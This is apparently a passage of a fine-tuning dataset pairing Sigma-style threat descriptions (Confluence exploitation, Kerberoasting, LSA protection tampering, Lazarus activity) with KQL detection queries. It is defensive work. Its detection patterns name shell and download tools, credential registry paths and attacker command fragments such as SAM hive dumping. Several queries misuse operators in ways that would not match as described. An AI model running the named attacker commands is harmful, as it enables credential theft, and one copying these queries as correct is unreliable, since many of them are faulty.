(\"13.107.6.171/32\", \"13.107.18.15/32\", \"13.107.140.6/32\", \"52.108.0.0/14\", \"52.244.37.168/32\", \"2603:1006:1400::/40\", \"2603:1016:2400::/40\", \"2603:1026:2400::/40\", \"2603:1036:2400::/40\", \"2603:1046:1400::/40\", \"2603:1056:1400::/40\", \"2603:1063:2000::/38\", \"2620:1ec:c::15/128\", \"2620:1ec:8fc::6/128\", \"2620:1ec:a92::171/128\", \"2a01:111:f100:2000::a83e:3019/128\", \"2a01:111:f100:2002::8975:2d79/128\", \"2a01:111:f100:2002::8975:2da8/128\", \"2a01:111:f100:7000::6fdd:6cd5/128\", \"2a01:111:f100:a004::bfeb:88cf/128\")) and Protocol =~ \"tcp\" and (RemotePort in~ (\"80\", \"443\"))) or ((InitiatingProcessRemoteSessionDeviceName in~ (\"20.20.32.0/19\", \"20.190.128.0/18\", \"20.231.128.0/19\", \"40.126.0.0/18\", \"2603:1006:2000::/48\", \"2603:1007:200::/48\", \"2603:1016:1400::/48\", \"2603:1017::/48\", \"2603:1026:3000::/48\", \"2603:1027:1::/48\", \"2603:1036:3000::/48\", \"2603:1037:1::/48\", \"2603:1046:2000::/48\", \"2603:1047:1::/48\", \"2603:1056:2000::/48\", \"2603:1057:2::/48\")) and Protocol =~ \"tcp\" and (RemotePort in~ (\"80\", \"443\"))) or ((InitiatingProcessRemoteSessionDeviceName in~ (\"13.107.6.192/32\", \"13.107.9.192/32\", \"52.108.0.0/14\", \"2620:1ec:4::192/128\", \"2620:1ec:a92::192/128\")) and Protocol =~ \"tcp\" and RemotePort == 443) or ((InitiatingProcessRemoteSessionDeviceName in~ (\"13.107.136.0/22\", \"40.108.128.0/17\", \"52.104.0.0/14\", \"104.146.128.0/17\", \"150.171.40.0/22\", \"2603:1061:1300::/40\", \"2620:1ec:8f8::/46\", \"2620:1ec:908::/46\", \"2a01:111:f402::/48\")) and Protocol =~ \"tcp\" and (RemotePort in~ (\"80\", \"443\"))))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2022-26134 Topic: proc_creation_lnx_cve_2022_26134_atlassian_confluence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"/java\" and (ProcessCommandLine in~ (\"/bin/sh\", \"bash\", \"dash\", \"ksh\", \"zsh\", \"csh\", \"fish\", \"curl\", \"wget\", \"python\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of an \"Active Directory Schema Cache File\" (.sch) file by an uncommon tool. Topic: file_event_win_adsi_cache_creation_by_uncommon_tool"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".sch\" and (not((((InitiatingProcessFolderPath endswith \":\\\\Program Files\\\\Cylance\\\\Desktop\\\\CylanceSvc.exe\" or InitiatingProcessFolderPath endswith \":\\\\Windows\\\\CCM\\\\CcmExec.exe\" or InitiatingProcessFolderPath endswith \":\\\\windows\\\\system32\\\\dllhost.exe\" or InitiatingProcessFolderPath endswith \":\\\\Windows\\\\system32\\\\dsac.exe\" or InitiatingProcessFolderPath endswith \":\\\\Windows\\\\system32\\\\efsui.exe\" or InitiatingProcessFolderPath endswith \":\\\\windows\\\\system32\\\\mmc.exe\" or InitiatingProcessFolderPath endswith \":\\\\windows\\\\system32\\\\svchost.exe\" or InitiatingProcessFolderPath endswith \":\\\\Windows\\\\System32\\\\wbem\\\\WmiPrvSE.exe\" or InitiatingProcessFolderPath endswith \":\\\\windows\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\") or (InitiatingProcessFolderPath contains \":\\\\Windows\\\\ccmsetup\\\\autoupgrade\\\\ccmsetup\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\SentinelOne\\\\Sentinel Agent\")) or ((InitiatingProcessFolderPath contains \":\\\\Program Files\\\\\" and InitiatingProcessFolderPath contains \"\\\\Microsoft Office\") and InitiatingProcessFolderPath =~ \"\\\\OUTLOOK.EXE\")))) and (not((InitiatingProcessFolderPath in~ (\":\\\\Program Files\\\\Citrix\\\\Receiver StoreFront\\\\Services\\\\DefaultDomainServices\\\\Citrix.DeliveryServices.DomainServices.ServiceHost.exe\", \"\\\\LANDesk\\\\LDCLient\\\\ldapwhoami.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious changes to the SentinelOne context menu scan command by a process other than SentinelOne. Topic: registry_set_sentinelone_shell_context_tampering"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\shell\\\\SentinelOneScan\\\\command*\" and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\SentinelOne\\\\\", \"C:\\\\Program Files (x86)\\\\SentinelOne\\\\\")) or (RegistryValueData contains \"\\\\SentinelScanFromContextMenu.exe\" and (RegistryValueData startswith \"C:\\\\Program Files\\\\SentinelOne\\\\Sentinel Agent\" or RegistryValueData startswith \"C:\\\\Program Files (x86)\\\\SentinelOne\\\\Sentinel Agent\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the removal of a port or application rule in the Windows Firewall configuration using netsh Topic: proc_creation_win_netsh_fw_delete_rule"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"firewall\", \"delete \")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")) and (not((InitiatingProcessFileName =~ \"\\\\Dropbox.exe\" and ProcessCommandLine =~ \"name=Dropbox\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This is a threat-hunting query to collect information related to the interactive execution of a script from inside a compressed file (zip/rar). Windows will automatically run the script using scripting interpreters such as wscript and cscript binaries.\n\nFrom the query below, the child process is the script interpreter that will execute the script. The script extension is also a set of standard extensions that Windows OS recognizes. Selections 1-3 contain three different execution scenarios.\n    1. Compressed file opened using 7zip.\n    2. Compressed file opened using WinRar.\n    3. Compressed file opened using native windows File Explorer capabilities.\n\nWhen the malicious script is double-clicked, it will be extracted to the respected directories as signified by the CommandLine on each of the three Selections. It will then be executed using the relevant script interpreter.\"\n Topic: proc_creation_win_susp_script_exec_from_compressed_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName =~ \"\\\\7z*.exe\" and ProcessCommandLine =~ \"\\\\AppData\\\\local\\\\temp\\\\7z*\\\\\") or (InitiatingProcessFileName =~ \"\\\\explorer.exe\" and (ProcessCommandLine in~ (\"\\\\AppData\\\\local\\\\temp*.rar\\\\\", \"\\\\AppData\\\\local\\\\temp*.zip\\\\\"))) or (InitiatingProcessFileName =~ \"\\\\winrar.exe\" and ProcessCommandLine =~ \"\\\\AppData\\\\local\\\\temp\\\\rar*\\\\\")) and ((ProcessCommandLine endswith \".hta\" or ProcessCommandLine endswith \".js\" or ProcessCommandLine endswith \".jse\" or ProcessCommandLine endswith \".ps1\" or ProcessCommandLine endswith \".vbe\" or ProcessCommandLine endswith \".vbs\" or ProcessCommandLine endswith \".wsf\" or ProcessCommandLine endswith \".wsh\") and (InitiatingProcessFolderPath in~ (\"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\wscript.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection that is initiated by the \"notepad.exe\" process.\nThis might be a sign of process injection from a beacon process or something similar.\nNotepad rarely initiates a network communication except when printing documents for example.\n Topic: net_connection_win_notepad"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessFolderPath =~ \"\\\\notepad.exe\" and (not(RemotePort == 9100))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects process creation with a renamed BrowserCore.exe (used to extract Azure tokens) Topic: proc_creation_win_renamed_browsercore"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"BrowserCore.exe\" and (not(InitiatingProcessFolderPath =~ \"\\\\BrowserCore.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"7za.dll\" Topic: image_load_side_load_7za"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\7za.dll\" and (not(((FolderPath startswith \"C:\\\\Program Files (x86)\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\\") and (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a scheduled task using the \"-XML\" flag with a file without the .xml extension. This behavior could be indicative of potential defense evasion attempt during persistence Topic: proc_creation_win_schtasks_schedule_via_masqueraded_xml_file"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"/create\", \"-create\")) and (ProcessCommandLine in~ (\"/xml\", \"-xml\")) and (FolderPath endswith \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\")) and (not((ProcessCommandLine =~ \".xml\" or ((InitiatingProcessCommandLine in~ (\":\\\\WINDOWS\\\\Installer\\\\MSI\", \".tmp,zzzzInvokeManagedCustomActionOutOfProc\")) and InitiatingProcessFileName =~ \"\\\\rundll32.exe\") or (InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\"))))) and (not((InitiatingProcessFileName in~ (\":\\\\Program Files\\\\Axis Communications\\\\AXIS Camera Station\\\\SetupActions.exe\", \":\\\\Program Files\\\\Axis Communications\\\\AXIS Device Manager\\\\AdmSetupActions.exe\", \":\\\\Program Files (x86)\\\\Zemana\\\\AntiMalware\\\\AntiMalware.exe\", \":\\\\Program Files\\\\Dell\\\\SupportAssist\\\\pcdrcui.exe\") or (InitiatingProcessFileName contains \":\\\\ProgramData\\\\OEM\\\\UpgradeTool\\\\CareCenter_\" and InitiatingProcessFileName contains \"\\\\BUnzip\\\\Setup_msi.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially uncommon child processes of SndVol.exe (the Windows volume mixer) Topic: proc_creation_win_sndvol_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\SndVol.exe\" and (not((ProcessCommandLine =~ \" shell32.dll,Control_RunDLL \" and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a \"rundll32\" process from the ColdSteel persistence service to initiate the cleanup command by calling one of its own exports. This functionality is not present in \"MileStone2017\" and some \"MileStone2016\" samples Topic: proc_creation_win_malware_coldsteel_cleanup"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessCommandLine in~ (\" -k msupdate\", \" -k msupdate2\", \" -k alg\")) and InitiatingProcessFileName =~ \"\\\\svchost.exe\" and (ProcessCommandLine in~ (\"UpdateDriverForPlugAndPlayDevicesW\", \"ServiceMain\", \"DiUninstallDevice\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a \"dllhost\" process spawning with no commandline arguments which is very rare to happen and could indicate process injection activity or malware mimicking similar system processes. Topic: proc_creation_win_dllhost_no_cli_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"dllhost.exe\", \"dllhost\")) and InitiatingProcessFolderPath =~ \"\\\\dllhost.exe\") and (not(isnull(ProcessCommandLine)))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Identifies the execution traces of the XCSSET malware. XCSSET is a macOS trojan that primarily spreads via Xcode projects and maliciously modifies applications. Infected users are also vulnerable to having their credentials, accounts, and other vital data stolen. Topic: proc_creation_macos_xcsset_malware_infection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName =~ \"/bash\" and (ProcessCommandLine in~ (\"/sys/log.php\", \"/sys/prepod.php\", \"/sys/bin/Pods\")) and InitiatingProcessFolderPath =~ \"/curl\") and ProcessCommandLine =~ \"https://\") or ((InitiatingProcessFileName =~ \"/bash\" and (ProcessCommandLine in~ (\"/Users/\", \"/Library/Group Containers/\")) and InitiatingProcessFolderPath =~ \"/osacompile\") or (InitiatingProcessFileName =~ \"/bash\" and (ProcessCommandLine in~ (\"LSUIElement\", \"/Users/\", \"/Library/Group Containers/\")) and InitiatingProcessFolderPath =~ \"/plutil\") or ((ProcessCommandLine in~ (\"-r\", \"/Users/\", \"/Library/Group Containers/\")) and InitiatingProcessFolderPath =~ \"/zip\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the setting of the DLL that handles the custom protocol handler.\nSeen being created by Forest Blizzard APT as reported by MSFT.\n Topic: registry_set_apt_forest_blizzard_custom_protocol_handler_dll"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\CLSID\\\\{026CC6D7-34B2-33D5-B551-CA31EB6CE345}\\\\Server\" and RegistryValueData endswith \".dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to force stop the ufw using ufw-init Topic: proc_creation_lnx_disable_ufw"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"-ufw-init\", \"force-stop\")) or (ProcessCommandLine in~ (\"ufw\", \"disable\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects service principal name (SPN) enumeration used for Kerberoasting Topic: proc_creation_win_setspn_spn_enumeration"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -q \", \" /q \")) and (FolderPath endswith \"\\\\setspn.exe\" or ProcessVersionInfoOriginalFileName =~ \"setspn.exe\" or (ProcessVersionInfoFileDescription contains \"Query or reset the computer\" and ProcessVersionInfoFileDescription contains \"SPN attribute\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects .NET CLR DLLs being loaded by scripting applications such as wscript or cscript. This could be an indication of potential suspicious execution. Topic: image_load_susp_script_dotnet_clr_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\clr.dll\" or FolderPath endswith \"\\\\mscoree.dll\" or FolderPath endswith \"\\\\mscorlib.dll\") and (InitiatingProcessFolderPath in~ (\"\\\\cmstp.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\msxsl.exe\", \"\\\\regsvr32.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of whoami that has been renamed to a different name to avoid detection Topic: proc_creation_win_renamed_whoami"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"whoami.exe\" and (not(InitiatingProcessFolderPath =~ \"\\\\whoami.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the addition of a new LogonScript to the registry value \"UserInitMprLogonScript\" for potential persistence Topic: proc_creation_win_registry_logon_script"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"UserInitMprLogonScript\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the find command to execute a shell. Such behavior may be associated with privilege escalation, unauthorized command execution, or exploitation attempt.\n Topic: proc_creation_lnx_find_shell_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/bin/bash\", \"/bin/dash\", \"/bin/fish\", \"/bin/sh\", \"/bin/zsh\")) and ((ProcessCommandLine in~ (\" . \", \"-exec\")) and InitiatingProcessFolderPath =~ \"/find\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects any deletion of entries in \".*\\shell\\open\\command\" registry keys.\nThese registry keys might have been used for COM hijacking activities by a threat actor or an attacker and the deletion could indicate steps to remove its tracks.\n Topic: registry_delete_removal_com_hijacking_registry_key"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((ActionType in~ (\"RegistryKeyDeleted\", \"RegistryValueDeleted\")) and RegistryKey endswith \"\\\\shell\\\\open\\\\command\") and (not(((InitiatingProcessFolderPath =~ \"\\\\Dropbox.exe\" and RegistryKey contains \"\\\\Dropbox.\") or (InitiatingProcessFolderPath =~ \"\\\\Everything.exe\" and RegistryKey contains \"\\\\Everything.\") or InitiatingProcessFolderPath =~ \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\" or (InitiatingProcessFolderPath =~ \"\\\\installer.exe\" and RegistryKey contains \"\\\\Classes\\\\WOW6432Node\\\\CLSID\\\\{4299124F-F2C3-41b4-9C73-9236B2AD0E8F}\") or InitiatingProcessFolderPath =~ \"\\\\OfficeClickToRun.exe\" or InitiatingProcessFolderPath =~ \"\\\\installer.exe\" or (InitiatingProcessFolderPath contains \"peazip\" and RegistryKey contains \"\\\\PeaZip.\") or InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\svchost.exe\" or InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\Installer\\\\MSI\" or (InitiatingProcessFolderPath =~ \"\\\\AppData\\\\Local\\\\Temp\\\\Wireshark_uninstaller.exe\" and RegistryKey endswith \"\\\\wireshark-capture-file*\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of utilities such as systemctl, service...etc to stop or disable tools and services Topic: proc_creation_lnx_services_stop_and_disable"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"stop\", \"disable\")) and (InitiatingProcessFolderPath in~ (\"/service\", \"/systemctl\", \"/chkconfig\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects MsiExec loading a DLL and calling its DllUnregisterServer function Topic: proc_creation_win_msiexec_dll"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \".dll\" and (ProcessCommandLine contains \" -z \" or ProcessCommandLine contains \" /z \" or ProcessCommandLine contains \" \u2013z \" or ProcessCommandLine contains \" \u2014z \" or ProcessCommandLine contains \" \u2015z \") and (FolderPath endswith \"\\\\msiexec.exe\" or ProcessVersionInfoOriginalFileName =~ \"\\\\msiexec.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects processes that query known 3rd party registry keys that holds credentials via commandline Topic: proc_creation_win_registry_enumeration_for_credentials_cli"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\Software\\\\SimonTatham\\\\PuTTY\\\\Sessions\", \"\\\\Software\\\\SimonTatham\\\\PuTTY\\\\SshHostKeys\\\\\", \"\\\\Software\\\\Mobatek\\\\MobaXterm\\\\\", \"\\\\Software\\\\WOW6432Node\\\\Radmin\\\\v3.0\\\\Server\\\\Parameters\\\\Radmin\", \"\\\\Software\\\\Aerofox\\\\FoxmailPreview\", \"\\\\Software\\\\Aerofox\\\\Foxmail\\\\V3.1\", \"\\\\Software\\\\IncrediMail\\\\Identities\", \"\\\\Software\\\\Qualcomm\\\\Eudora\\\\CommandLine\", \"\\\\Software\\\\RimArts\\\\B2\\\\Settings\", \"\\\\Software\\\\OpenVPN-GUI\\\\configs\", \"\\\\Software\\\\Martin Prikryl\\\\WinSCP 2\\\\Sessions\", \"\\\\Software\\\\FTPWare\\\\COREFTP\\\\Sites\", \"\\\\Software\\\\DownloadManager\\\\Passwords\", \"\\\\Software\\\\OpenSSH\\\\Agent\\\\Keys\", \"\\\\Software\\\\TightVNC\\\\Server\", \"\\\\Software\\\\ORL\\\\WinVNC3\\\\Password\", \"\\\\Software\\\\RealVNC\\\\WinVNC4\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modifications to the \"Hidden\" and \"ShowSuperHidden\" explorer registry values in order to disable showing of hidden files and system files.\nThis technique is abused by several malware families to hide their files from normal users.\n Topic: registry_set_hide_file"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\ShowSuperHidden\" or RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Advanced\\\\Hidden\") and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects different process execution behaviors as described in various threat reports on Lazarus group activity Topic: proc_creation_win_apt_lazarus_group_activity"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"reg.exe save hklm\\\\sam %temp%\\\\~reg_sam.save\", \"1q2w3e4r@#$@#$@#$\", \" -hp1q2w3e4 \", \".dat data03 10000 -p \")) or (ProcessCommandLine in~ (\"netstat -aon | find \", \"ESTA\", \" > %temp%\\\\~\")) or (ProcessCommandLine in~ (\".255 10 C:\\\\ProgramData\\\\IBM\\\\\", \".DAT\")) or (ProcessCommandLine in~ (\" /c \", \" -p 0x\")) or (ProcessCommandLine in~ (\"rundll32 \", \"C:\\\\ProgramData\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of LiveKD with the \"-m\" flag to potentially dump the kernel memory Topic: proc_creation_win_sysinternals_livekd_kernel_memory_dump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\livekd.exe\" or FolderPath endswith \"\\\\livekd64.exe\") or ProcessVersionInfoOriginalFileName =~ \"livekd.exe\") and (ProcessCommandLine contains \" -m\" or ProcessCommandLine contains \" /m\" or ProcessCommandLine contains \" \u2013m\" or ProcessCommandLine contains \" \u2014m\" or ProcessCommandLine contains \" \u2015m\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect the creation of a service with a service binary located in a suspicious directory Topic: registry_set_creation_service_susp_folder"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey =~ \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet001\\\\Services*\" and RegistryKey endswith \"\\\\Start\" and (InitiatingProcessFolderPath contains \"\\\\Users\\\\Public\\\\\" or InitiatingProcessFolderPath contains \"\\\\Perflogs\\\\\" or InitiatingProcessFolderPath contains \"\\\\ADMIN$\\\\\" or InitiatingProcessFolderPath contains \"\\\\Temp\\\\\") and (RegistryValueData in~ (\"DWORD (0x00000000)\", \"DWORD (0x00000001)\", \"DWORD (0x00000002)\"))) or (RegistryKey =~ \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet001\\\\Services*\" and RegistryKey endswith \"\\\\ImagePath\" and (RegistryValueData contains \"\\\\Users\\\\Public\\\\\" or RegistryValueData contains \"\\\\Perflogs\\\\\" or RegistryValueData contains \"\\\\ADMIN$\\\\\" or RegistryValueData contains \"\\\\Temp\\\\\"))) and (not((InitiatingProcessFolderPath contains \"\\\\Common Files\\\\\" and InitiatingProcessFolderPath contains \"\\\\Temp\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious execution of Powercfg.exe to change lock screen timeout Topic: proc_creation_win_powercfg_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\powercfg.exe\" or ProcessVersionInfoOriginalFileName =~ \"PowerCfg.exe\") and ((ProcessCommandLine contains \"/setacvalueindex \" and ProcessCommandLine contains \"SCHEME_CURRENT\" and ProcessCommandLine contains \"SUB_VIDEO\" and ProcessCommandLine contains \"VIDEOCONLOCK\") or (ProcessCommandLine contains \"-change \" and ProcessCommandLine contains \"-standby-timeout-\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects SILENTTRINITY stager dll loading activity Topic: image_load_hktl_silenttrinity_stager"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where InitiatingProcessVersionInfoFileDescription contains \"st2stager\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of the \"reg.exe\" utility to disable PPL protection on the LSA process Topic: proc_creation_win_reg_lsa_ppl_protection_disabled"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" add \", \" /d 0\", \" /v RunAsPPL \")) and (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the modification of the registry to disable a system restore on the computer Topic: registry_set_disable_system_restore"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\Policies\\\\Microsoft\\\\Windows NT\\\\SystemRestore\" or RegistryKey contains \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SystemRestore\") and (RegistryKey endswith \"DisableConfig\" or RegistryKey endswith \"DisableSR\") and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"Add-WindowsCapability\" cmdlet to add Windows capabilities. Notable capabilities could be \"OpenSSH\" and others. Topic: proc_creation_win_powershell_add_windows_capability"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"OpenSSH.\" and ProcessCommandLine =~ \"Add-WindowsCapability\" and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects VB DLLs loaded by an office application. Which could indicate the presence of VBA Macros. Topic: image_load_office_vbadll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\VBE7.DLL\" or FolderPath endswith \"\\\\VBEUI.DLL\" or FolderPath endswith \"\\\\VBE7INTL.DLL\") and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\mspub.exe\", \"\\\\onenote.exe\", \"\\\\onenoteim.exe\", \"\\\\outlook.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of different log query utilities and commands to search and dump the content of specific event logs or look for specific event IDs.\nThis technique is used by threat actors in order to extract sensitive information from events logs such as usernames, IP addresses, hostnames, etc.\n Topic: proc_creation_win_susp_eventlog_content_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"-InstanceId 4778\", \".eventid -eq 4778\", \"System[EventID=4778]\", \"-InstanceId 25\", \".eventid -eq 25\", \"System[EventID=25]\") or ProcessCommandLine =~ \"-InstanceId 462*\" or ProcessCommandLine =~ \".eventid -eq 462*\" or (ProcessCommandLine contains \"EventCode=\" and ProcessCommandLine contains \"462\") or (ProcessCommandLine contains \"EventIdentifier=\" and 